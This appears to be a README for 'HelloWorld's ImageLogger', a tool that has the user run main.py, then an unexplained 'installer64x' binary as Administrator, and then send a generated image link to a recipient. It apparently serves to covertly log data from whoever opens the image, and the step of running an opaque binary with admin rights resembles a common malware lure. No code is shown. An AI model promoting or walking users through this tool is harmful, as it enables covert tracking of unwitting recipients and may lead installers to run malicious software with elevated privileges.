Welcome to HelloWorld's ImageLogger, a robust image logging solution. To get started, follow these steps:

Begin by running main.py and allow it to automatically close (typically within 5 to 10 seconds).
Next, run installer64x as an Administrator. If you can't find installer64x, ensure that your operating system is compatibleâ€”currently, the logger supports Windows 7 and Windows 10 (compatibility with Windows 11 and Vista is expected in the next update).
Finally, after running installer64x, execute main.py once more. Input the desired image link address and send it to the intended recipient. Remember to maintain the connection for successful transmission.
Note: Ensure you have Python 3.11 or a later version installed for optimal functionality. If you have any questions or encounter issues, feel free to seek assistance. Thank you for choosing HelloWorld's ImageLogger."
